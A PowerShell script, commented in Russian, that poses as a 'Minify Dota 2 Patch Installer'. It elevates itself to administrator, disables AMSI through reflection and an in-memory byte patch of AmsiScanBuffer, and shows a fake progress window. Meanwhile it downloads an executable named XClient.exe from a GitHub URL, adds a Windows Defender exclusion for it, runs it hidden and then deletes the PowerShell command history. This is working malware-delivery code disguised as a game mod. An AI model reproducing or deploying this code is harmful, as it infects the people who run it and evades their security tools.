if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- СЕКЦИЯ ОБХОДА ЗАЩИТЫ ---
function Invoke-StealthBypass {
    Write-Host "Инициализация системы обхода..." -ForegroundColor Cyan
    
    # Метод 1: Прямое изменение сессии AMSI через рефлексию
    try {
        $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiContext = $amsiUtils.GetField('amsiSession', 'NonPublic,Static')
        $amsiContext.SetValue($null, $null)
    } catch {}

    # Метод 2: Патчинг AmsiScanBuffer в памяти
    try {
        $Win32 = Add-Type -MemberDefinition @"
            [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -Name "Win32Functions" -Namespace "Win32Api" -PassThru

        $hModule = $Win32::LoadLibrary("amsi.dll")
        $addr = $Win32::GetProcAddress($hModule, "AmsiScanBuffer")
        
        $oldProtect = 0
        $Win32::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtect)
        
        $patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
        
        $Win32::VirtualProtect($addr, [uint32]6, $oldProtect, [ref]$oldProtect)
    } catch {
        # Резервный метод: флаг ошибки инициализации
        $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        $amsiInitFailed = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
        $amsiInitFailed.SetValue($null, $true)
    }
}

# Выполняем обход
Invoke-StealthBypass

# --- СЕКЦИЯ ГРАФИЧЕСКОГО ИНТЕРФЕЙСА ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
$form.Size = New-Object System.Drawing.Size(600,400)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(20,30)
$titleLabel.Size = New-Object System.Drawing.Size(540,30)
$titleLabel.Text = "Minify Dota 2 Patch Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($titleLabel)

$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20,300)
$progressBar.Size = New-Object System.Drawing.Size(540,23)
$form.Controls.Add($progressBar)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(20,330)
$statusLabel.Size = New-Object System.Drawing.Size(540,20)
$statusLabel.Text = "Подготовка..."
$form.Controls.Add($statusLabel)

# Показываем форму в отдельном потоке не блокируя скрипт
$form.Show()

# --- ПРОЦЕСС "УСТАНОВКИ" ---
$steps = @(
    "Анализ файлов Dota 2...",
    "Оптимизация шейдеров...",
    "Применение патча производительности...",
    "Загрузка дополнительных модулей...",
    "Финализация..."
)

for ($i = 0; $i -lt $steps.Count; $i++) {
    $statusLabel.Text = $steps[$i]
    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
    $form.Refresh()
    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
}

# --- ЗАГРУЗКА И ЗАПУСК ---
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$p = "$env:TEMP\sys_update.exe"

try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($u, $p)
    
    # Добавляем в исключения перед запуском
    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
    
    $statusLabel.Text = "Установка завершена!"
    $form.Refresh()
    Start-Sleep -Seconds 1
    
    Start-Process -FilePath $p -WindowStyle Hidden
    $form.Close()
    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
} catch {
    $statusLabel.Text = "Ошибка сети при установке."
    Start-Sleep -Seconds 2
    $form.Close()
}

# Очистка истории
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
